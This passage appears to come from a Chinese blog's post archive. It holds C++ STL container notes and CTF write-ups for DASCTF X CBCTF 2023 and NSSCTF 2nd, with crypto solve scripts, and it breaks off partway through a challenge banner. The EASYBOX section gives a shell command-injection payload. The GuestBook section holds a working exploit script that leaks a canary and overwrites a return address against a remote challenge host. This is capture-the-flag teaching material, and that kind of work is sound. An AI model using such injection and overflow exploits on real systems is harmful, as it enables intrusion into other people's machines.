<li><code>vector.[0];</code> 访问vector的第1个元素 ， 可进行赋值等操作</li>
<li><code>vector.at(0); </code>&#x2F;访问vector的第1个元素，如果越界会抛出异常 </li>
<li><code>for (int i = 0; i &lt; v.size(); i++) &#123; cout &lt;&lt; v[i] &lt;&lt; &quot; &quot;; &#125; </code> 遍历vector</li>
<li><code>vector.resize()</code> 改变实际元素的个数，新添加的元素会被默认初始化 </li>
<li><code>vector.size() </code>获取vector的大小 ，这是当前存储的元素数量</li>
<li><code>vector.capacity()</code>返回当前容量，这是目前容器最多储存的元素数量</li>
<li><code>vector.front() </code>返回第一个元素的引用 </li>
<li><code>vector.back()</code>返回最后一个元素的引用 </li>
<li><code>vector.begin()</code>返回指向容器中第一个元素的迭代器 </li>
<li><code>vector.end()</code>返回指向容器最后一个元素所在位置后一个位置的迭代器，通常和 begin() 结合使用</li>
<li><code>vector.empty()</code>判断一个vector是否为空</li>
</ul>
<h2 id="STL容器适配器"><a href="#STL容器适配器" class="headerlink" title="STL容器适配器"></a>STL容器适配器</h2><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><ul>
<li><code>stack&lt;T&gt;</code> 创建栈对象</li>
<li><code>push(element)</code>：将元素压入栈顶</li>
<li><code>pop()</code>：弹出栈顶元素</li>
<li><code>top()</code>：返回栈顶元素</li>
<li><code>empty()</code>：返回栈是否为空</li>
<li><code>size()</code>：返回栈中元素的数量</li>
</ul>
<blockquote>
<p>清空栈操作： <code>while (!myStack.empty()) &#123; myStack.pop(); &#125; </code></p>
</blockquote>
<h3 id="queue"><a href="#queue" class="headerlink" title="queue"></a>queue</h3><ul>
<li><code>queue &lt;int&gt; </code> 创建queue对象</li>
<li><code>push(element)</code>：将元素添加到队列的末尾</li>
<li><code>pop()</code>：从队列的头部取出元素，并将其从队列中删除</li>
<li><code>front()</code>：返回队列头部的元素，但不将其从队列中删除</li>
<li><code>back()</code>：返回队列末尾的元素，但不将其从队列中删除</li>
<li><code>size()</code>：返回队列中元素的数量</li>
<li><code>empty()</code>：判断队列是否为空</li>
</ul>
<h3 id="priority-queue"><a href="#priority-queue" class="headerlink" title="priority_queue"></a>priority_queue</h3><ul>
<li><p><code>push(element)</code>：将元素添加到优先队列中，根据优先级顺序排列。</p>
</li>
<li><p><code>pop()</code>：从优先队列中取出优先级最高的元素，并将其从队列中删除。</p>
</li>
<li><p><code>top()</code>：返回优先队列中优先级最高的元素，但不将其从队列中删除。</p>
</li>
<li><p><code>size()</code>：返回优先队列中元素的数量。</p>
</li>
<li><p><code>empty()</code>：判断优先队列是否为空</p>
</li>
<li><p><code>priority_queue&lt;int, std::vector&lt;int&gt;, std::less&lt;int&gt;&gt; myMaxHeap;</code>创建大顶堆</p>
</li>
<li><p><code>less&lt;int&gt;</code>是<code>priority_queue</code>的默认比较函数，因此在创建大顶堆时可以省略第三个参数。以下是更简洁的表达式：<code>priority_queue&lt;int&gt; myMaxHeap;</code></p>
</li>
<li><p><code>priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; myMinHeap; </code> 创建小顶堆</p>
</li>
</ul>
<blockquote>
<p><code>priority_queue&lt;int, vector&lt;int&gt;,greater&lt;int&gt;&gt;</code> 指定了使用<code>greater&lt;int&gt;</code> 作为比较函数，因此创建的优先队列是升序的，即优先级数值小的元素排在队列前面。如果想要创建降序的优先队列，可以使用 <code>less&lt;int&gt;</code> 作为比较函数，例如 <code>priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt;&gt;</code>  </p>
</blockquote>
<p>EG: 优先队列实现滑动窗口求最大值</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> k; <span class="comment">// 滑动窗口大小</span></span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">nums</span><span class="params">(n)</span></span>; <span class="comment">// 输入数组</span></span><br><span class="line">    priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; pq; <span class="comment">// 定义优先队列，存放数值和下标</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++)</span><br><span class="line">        cin &gt;&gt; nums[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先将前 k 个元素加入优先队列</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        pq.<span class="built_in">push</span>(&#123; nums[i], i &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出第一个滑动窗口的最大值</span></span><br><span class="line">    cout &lt;&lt; pq.<span class="built_in">top</span>().first &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 滑动窗口向右移动，每次加入一个新元素，弹出一个旧元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        pq.<span class="built_in">push</span>(&#123; nums[i], i &#125;); <span class="comment">// 加入新元素</span></span><br><span class="line">        <span class="keyword">while</span> (pq.<span class="built_in">top</span>().second &lt;= i - k) &#123; <span class="comment">// 弹出旧元素</span></span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; pq.<span class="built_in">top</span>().first &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// 输出当前滑动窗口的最大值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h3><ul>
<li><code>push_back(element)</code>：在队尾插入一个元素。</li>
<li><code>pop_back()</code>：删除队尾元素。</li>
<li><code>push_front(element)</code>：在队头插入一个元素。</li>
<li><code>pop_front()</code>：删除队头元素。</li>
<li><code>front()</code>：返回队头元素，但不删除。</li>
<li><code>back()</code>：返回队尾元素，但不删除。</li>
<li><code>empty()</code>：如果队列为空，返回true，否则返回false。</li>
<li><code>size()</code>：返回队列中元素的个数。</li>
</ul>
<h3 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h3><ul>
<li><code>make_heap(first, last)</code>：将[first, last)区间内的元素转换为堆。</li>
<li><code>push_heap(first, last)</code>：将[first, last-1)区间内的元素插入堆中。</li>
<li><code>pop_heap(first, last)</code>：将堆顶元素移动到[last-1]位置，并重新构建堆。</li>
<li><code>sort_heap(first, last)</code>：将[first, last)区间内的元素排序，使其满足堆的性质。</li>
<li><code>is_heap(first, last)</code>：如果[first, last)区间内的元素满足堆的性质，返回true，否则返回false。</li>
<li><code>push()</code>：将元素添加到堆中。</li>
<li><code>pop()</code>：从堆中移除根节点元素。</li>
<li><code>top()</code>：返回堆中的根节点元素。</li>
<li><code>empty()</code>：检查堆是否为空。</li>
<li><code>size()</code>：返回堆中元素的数量。</li>
</ul>
<blockquote>
<p>STL中，堆是通过vector容器实现的，因此要声明一个堆对象，需要先声明一个vector容器，然后使用make_heap()函数将其转换为堆</p>
<p><del>不如手搓</del></p>
</blockquote>
<h3 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h3><p><code>template&lt;class T1, class T2&gt; struct pair;</code>其中，<code>T1</code>和<code>T2</code>表示两个不同的类型。<code>std::pair</code>类包含了两个公有成员变量<code>first</code>和<code>second</code>，分别表示这两个值。可以通过以下方式创建和访问<code>std::pair</code>对象： </p>
<p>编译器并不会对<code>std::vector&lt;std::pair&lt;int, int&gt;&gt;</code>中的元素顺序进行任何假设或者判断。它只会根据你的代码中对这个<code>std::vector</code>对象的使用来确定元素顺序。</p>
<p>例如，如果你在代码中使用<code>v[i].first</code>来访问第i个元素的第一个元素，编译器就会认为第一个元素表示数值，第二个元素表示下标。如果你使用<code>v[i].second</code>来访问第i个元素的第二个元素，编译器就会认为第一个元素表示下标，第二个元素表示数值。</p>
<h2 id="迭代器类型补充"><a href="#迭代器类型补充" class="headerlink" title="迭代器类型补充"></a>迭代器类型补充</h2><p>在C++中，STL容器的迭代器可以分为5种类型，分别是：</p>
<ol>
<li>输入迭代器（Input Iterator）：只读，只能单向移动，每个元素只能被访问一次。例如<code>istream_iterator</code>。</li>
<li>输出迭代器（Output Iterator）：只写，只能单向移动，每个元素只能被赋值一次。例如<code>ostream_iterator</code>。</li>
<li>前向迭代器（Forward Iterator）：可读写，只能单向移动，每个元素可以被访问或赋值多次。例如<code>forward_list</code>。</li>
<li>双向迭代器（Bidirectional Iterator）：可读写，可以双向移动，每个元素可以被访问或赋值多次。例如<code>list</code>。</li>
<li>随机访问迭代器（Random Access Iterator）：可读写，可以随机访问，支持加减运算，可以跳跃式访问容器中的元素。例如<code>vector</code>、<code>deque</code>。</li>
</ol>
<p>因此，可以根据迭代器的类型来判断容器是否支持随机访问。以下是一些常见的STL容器及其迭代器类型：</p>
<ol>
<li><code>vector</code>：支持随机访问迭代器。</li>
<li><code>deque</code>：支持随机访问迭代器。</li>
<li><code>list</code>：支持双向迭代器。</li>
<li><code>forward_list</code>：支持前向迭代器。</li>
<li><code>set</code>：支持双向迭代器。</li>
<li><code>map</code>：支持双向迭代器。</li>
<li><code>unordered_set</code>：支持前向迭代器。</li>
<li><code>unordered_map</code>：支持前向迭代器。</li>
</ol>
<blockquote>
<p>迭代器类型的不同，使得for循环的操作写法不同</p>
<p>支持随机访问的可以使用熟悉的写法，对元素进行操作；不支持的如双向迭代器要对迭代器进行操作</p>
</blockquote>
<p>需要注意的是，对于容器的不同操作，可能需要不同类型的迭代器。例如，对于<code>list</code>容器，如果需要在容器中间插入或删除元素，需要使用双向迭代器；而如果只是进行遍历，可以使用前向迭代器。</p>
<p><em><u>而且，要注意的是</u></em></p>
<blockquote>
<p><code>stack</code>是STL中的一个容器适配器，它并不是一个容器，因此没有迭代器。<code>stack</code>只提供了很少的操作，主要包括<code>push()</code>、<code>pop()</code>、<code>top()</code>、<code>empty()</code>和<code>size()</code>等方法，这些方法都是直接对栈顶元素进行操作，不需要使用迭代器来遍历栈中的元素。因此，<code>stack</code>并不属于任何一种迭代器类型。 </p>
</blockquote>
<h2 id="STL对于空间大小的规定"><a href="#STL对于空间大小的规定" class="headerlink" title="STL对于空间大小的规定"></a>STL对于空间大小的规定</h2><p>STL（标准模板库）中的容器分为两类：</p>
<ol>
<li><strong>顺序容器（Sequence Containers）</strong>：这些容器按照元素在容器中的位置来组织和存储元素。顺序容器包括<code>vector</code>、<code>deque</code>、<code>list</code>、<code>forward_list</code>、<code>array</code>。<ul>
<li><code>vector</code>、<code>deque</code>、<code>array</code>需要在创建容器对象时指定容器的大小，因为它们使用连续的内存存储元素，所以需要预先分配足够的内存空间。</li>
<li><code>list</code>、<code>forward_list</code>不需要指定容器大小，它们使用链表存储元素，可以动态地分配和释放内存。</li>
</ul>
</li>
<li><strong>关联容器（Associative Containers）</strong>：这些容器按照元素的键值来组织和存储元素。关联容器包括<code>set</code>、<code>multiset</code>、<code>map</code>、<code>multimap</code>。<ul>
<li>关联容器不需要在创建容器对象时指定容器的大小，它们使用树形结构存储元素，可以动态地分配和释放内存。</li>
</ul>
</li>
</ol>
<p>此外，还有另一种容器叫做<code>stack</code>和<code>queue</code>，它们是容器适配器（Container Adaptors），是在顺序容器的基础上提供了特定的接口，使其按照一定的规则进行操作。<code>stack</code>和<code>queue</code>都是基于顺序容器实现的，但是它们不需要指定容器的大小，因为它们使用的是顺序容器的默认构造函数，自动创建一个空的容器对象。</p>
<p>总之，顺序容器中的<code>vector</code>、<code>deque</code>和<code>array</code>需要指定容器大小，而<code>list</code>和<code>forward_list</code>不需要。关联容器和容器适配器都不需要指定容器大小。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF X CBCTF 2023 WP</title>
    <url>/posts/ec1aa757/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DASCTF-X-CBCTF-2023-WP"><a href="#DASCTF-X-CBCTF-2023-WP" class="headerlink" title="DASCTF X CBCTF 2023 WP"></a>DASCTF X CBCTF 2023 WP</h1><p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310221106000.png" alt="image-20231022110621972"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="EASYBOX"><a href="#EASYBOX" class="headerlink" title="EASYBOX"></a>EASYBOX</h2><p>这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅</p>
<p>最后发现直接就是个web题，在PING函数里面执行system函数命令</p>
<span id="more"></span>

<blockquote>
<p>;tac fla’’g;</p>
</blockquote>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310272057437.png" alt="image-20231021182601723"></p>
<h2 id="GuestBook"><a href="#GuestBook" class="headerlink" title="GuestBook"></a>GuestBook</h2><p>输入name的时候有溢出，可以覆盖一个字节泄露canary，</p>
<p>接着在strcpy中有溢出，直接传payload，被strcpy遇b’\x00’截断这个问题卡住了（遇零截断意味着无法传输字符\x00，然而canary以\x00结尾）</p>
<p>调试解决发现在  __isoc99_scanf(“%s”, message);输入字符串的时候会在后面补零</p>
<p>于是可以通过多次输入先输入覆盖返回地址和canary除去\x00的七个字符，再给canary补上\x00</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Excalibur <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">contextset()</span><br><span class="line"></span><br><span class="line">remo(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28227</span>)</span><br><span class="line"><span class="comment">#proc(&#x27;./GuestBook&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug(&#x27;b *0x000000000040143C&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;name:&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x17</span>)+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">t1 = ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">pr(t1)</span><br><span class="line">canary0 = ru(<span class="string">b&#x27;How&#x27;</span>)[:-<span class="number">7</span>]</span><br><span class="line">canary = (u64(<span class="string">b&#x27;\x00&#x27;</span>+canary0))</span><br><span class="line">prh(canary)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x00000000004012C3</span></span><br><span class="line">sla(<span class="string">b&#x27;):&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sl(cyclic(<span class="number">0x98</span>)+<span class="string">b&#x27;a&#x27;</span>+canary0+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(system))</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pr(<span class="built_in">type</span>(canary))</span><br><span class="line">pay = cyclic(<span class="number">0x38</span>)<span class="comment">#+p64(canary)+b&#x27;a&#x27;*8+p64(system)</span></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>



<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310211839964.png" alt="image-20231021183919918"></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>想恢复p,关键在于二次剩余</p>
<p>加密是一个比特一个比特地加密,恢复时判断是否为二次剩余即可恢复</p>
<p>对于q就更简单,直接求多项式的gcd即可</p>
<p>代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369</span></span><br><span class="line"></span><br><span class="line">(e1, noise1, c1) = (<span class="number">1743</span>, <span class="number">44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776</span>, <span class="number">65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983</span>)</span><br><span class="line">(e2, noise2, c2) = (<span class="number">1325</span>, <span class="number">35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683</span>, <span class="number">50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714</span>)</span><br><span class="line">n2 = <span class="number">103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393</span></span><br><span class="line">n1 = <span class="number">65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309</span></span><br><span class="line">str0=<span class="string">&#x27;&#x27;</span><span class="comment">#wp装不下这么长的字符</span></span><br><span class="line"><span class="comment">#legendre_symbol(i,p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()        </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> GCD(b, a % b)</span><br><span class="line"></span><br><span class="line">F.&lt;x&gt;=PolynomialRing(Zmod(n2))</span><br><span class="line">f1=(x+noise1)^e1-c1</span><br><span class="line">f2=(x+noise2)^e2-c2</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(GCD(f1,f2))</span></span><br><span class="line"></span><br><span class="line">q=n2-<span class="number">103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902084990861262304328268863425199809518254496553684067856859306280794877830073274539837451563189724268783548897996668966918676147376205691514341926655798880936</span></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(q.nbits())</span><br><span class="line"></span><br><span class="line">strlist=str0.split(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"><span class="comment">#print(strlist)</span></span><br><span class="line">intlist=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> strlist[:-<span class="number">1</span>]]</span><br><span class="line"><span class="comment">#print(intlist)</span></span><br><span class="line">p=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> intlist:</span><br><span class="line">    <span class="comment">#print(&#x27;test&#x27;+p)</span></span><br><span class="line">    <span class="keyword">if</span> jacobi(i,n1)==<span class="number">1</span>:</span><br><span class="line">        p=<span class="string">&#x27;1&#x27;</span>+p</span><br><span class="line">        <span class="comment">#print(p)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=<span class="string">&#x27;0&#x27;</span>+p</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(p,base=<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p=<span class="built_in">int</span>(p,base=<span class="number">2</span>)      </span><br><span class="line"><span class="built_in">print</span>(is_prime(p))</span><br><span class="line"><span class="built_in">print</span>(ZZ(p).nbits())</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse_mod(<span class="number">65537</span>,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br></pre></td></tr></table></figure>

<h2 id="CB-backpack"><a href="#CB-backpack" class="headerlink" title="CB backpack"></a>CB backpack</h2><p>由于连续六个01串中有3个1，在原始背包格的基础上每连续六列新增一列，限制这个条件，最终LLL即可还原</p>
<p><del>脚本丢了XD</del></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF 2nd wp</title>
    <url>/posts/4b18615c/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="NSSCTF-2nd-WP"><a href="#NSSCTF-2nd-WP" class="headerlink" title="NSSCTF 2nd WP"></a>NSSCTF 2nd WP</h1><span id="more"></span>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="gift-in-qrcode"><a href="#gift-in-qrcode" class="headerlink" title="gift_in_qrcode"></a>gift_in_qrcode</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> qrcode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange, getrandbits, seed</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = os.getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> flag == <span class="literal">None</span>:</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;test&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">secret_seed = randrange(<span class="number">1</span>, <span class="number">1000</span>)</span><br><span class="line">seed(secret_seed)</span><br><span class="line">reveal = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    reveal.append(<span class="built_in">str</span>(getrandbits(<span class="number">8</span>)))</span><br><span class="line">target = getrandbits(<span class="number">8</span>)</span><br><span class="line">reveal = <span class="string">&quot;,&quot;</span>.join(reveal)</span><br><span class="line"></span><br><span class="line">img_qrcode = qrcode.make(reveal)</span><br><span class="line">img_qrcode = img_qrcode.crop((<span class="number">35</span>, <span class="number">35</span>, img_qrcode.size[<span class="number">0</span>] - <span class="number">35</span>, img_qrcode.size[<span class="number">1</span>] - <span class="number">35</span>))</span><br><span class="line"></span><br><span class="line">offset, delta, rate = <span class="number">50</span>, <span class="number">3</span>, <span class="number">5</span></span><br><span class="line">img_qrcode = img_qrcode.resize(</span><br><span class="line">    (<span class="built_in">int</span>(img_qrcode.size[<span class="number">0</span>] / rate), <span class="built_in">int</span>(img_qrcode.size[<span class="number">1</span>] / rate)), Image.LANCZOS</span><br><span class="line">)</span><br><span class="line">img_out = Image.new(<span class="string">&quot;RGB&quot;</span>, img_qrcode.size)</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img_qrcode.size[<span class="number">1</span>]):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img_qrcode.size[<span class="number">0</span>]):</span><br><span class="line">        pixel_qrcode = img_qrcode.getpixel((x, y))</span><br><span class="line">        <span class="keyword">if</span> pixel_qrcode == <span class="number">255</span>:</span><br><span class="line">            img_out.putpixel(</span><br><span class="line">                (x, y),</span><br><span class="line">                (</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                ),</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            img_out.putpixel(</span><br><span class="line">                (x, y),</span><br><span class="line">                (</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                ),</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">img_out.save(<span class="string">&quot;qrcode.png&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;qrcode.png&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;This my gift:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data).decode(), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br><span class="line">ans = <span class="built_in">input</span>(<span class="string">&quot;What&#x27;s your answer:&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> ans == <span class="built_in">str</span>(target):</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No no no!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>题目所给附件内容如上</p>
<p>分析过后发现直接输入打印出的target即可获得flag</p>
<h3 id="Magic-Docker"><a href="#Magic-Docker" class="headerlink" title="Magic Docker"></a>Magic Docker</h3><p>题目提示执行命令，docker run randark&#x2F;nssctf-round15-magic-docker</p>
<p>执行过后发现要求输入secrect</p>
<p>查看docker文件</p>
<p>发现app文件下的miain.py文件为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> click</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="meta">@click.command()</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--secret&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;default=none,between 0 and 100&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">int</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">secret</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(secret)==<span class="built_in">str</span>(answer):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Congratulations!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;But where is your flag?  (=‵ω′=)&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No! You don&#x27;t know anything about docker!&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;How dare you! &quot;</span>)</span><br><span class="line"></span><br><span class="line">BANNER=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">███╗   ██╗███████╗███████╗ ██████╗████████╗███████╗    ██████╗ ███╗   ██╗██████╗            </span></span><br><span class="line"><span class="string">████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝    ╚════██╗████╗  ██║██╔══██╗           </span></span><br><span class="line"><span class="string">██╔██╗ ██║███████╗███████╗██║        ██║   █████╗       █████╔╝██╔██╗ ██║██║  ██║           </span></span><br><span class="line"><span class="string">██║╚██╗██║╚════██║╚════██║██║        ██║   ██╔══╝      ██╔═══╝ ██║╚██╗██║██║  ██║           </span></span><br><span class="line"><span class="string">██║ ╚████║███████║███████║╚██████╗   ██║   ██║         ███████╗██║ ╚████║██████╔╝           </span></span><br><span class="line"><span class="string">╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝         ╚══════╝╚═╝  ╚═══╝╚═════╝            </span></span><br><span class="line"><span class="string">                                                                                            </span></span><br><span class="line"><span class="string">███╗   ███╗ █████╗  ██████╗ ██╗ ██████╗    ██████╗  ██████╗  ██████╗██╗  ██╗███████╗██████╗ </span></span><br><span class="line"><span class="string">████╗ ████║██╔══██╗██╔════╝ ██║██╔════╝    ██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗</span></span><br><span class="line"><span class="string">██╔████╔██║███████║██║  ███╗██║██║         ██║  ██║██║   ██║██║     █████╔╝ █████╗  ██████╔╝</span></span><br><span class="line"><span class="string">██║╚██╔╝██║██╔══██║██║   ██║██║██║         ██║  ██║██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗</span></span><br><span class="line"><span class="string">██║ ╚═╝ ██║██║  ██║╚██████╔╝██║╚██████╗   